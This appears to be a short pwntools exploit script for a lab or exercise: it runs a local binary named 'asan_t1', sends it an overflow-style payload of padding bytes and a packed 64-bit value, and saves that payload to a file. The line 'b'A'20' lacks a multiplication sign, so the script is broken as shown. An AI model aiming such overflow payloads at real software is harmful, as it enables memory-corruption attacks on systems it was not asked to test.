#!/usr/bin/env python3
from pwn import*
context(arch="amd64", os="linux")
p = process('./asan_t1')
p.sendline(b'5555' + b'A'20 + p64(5555))
print(p.recv())
f =open("input1_t1", "wb")
f.write(b'5555' + b'A'20 + p64(5555))
f.close()
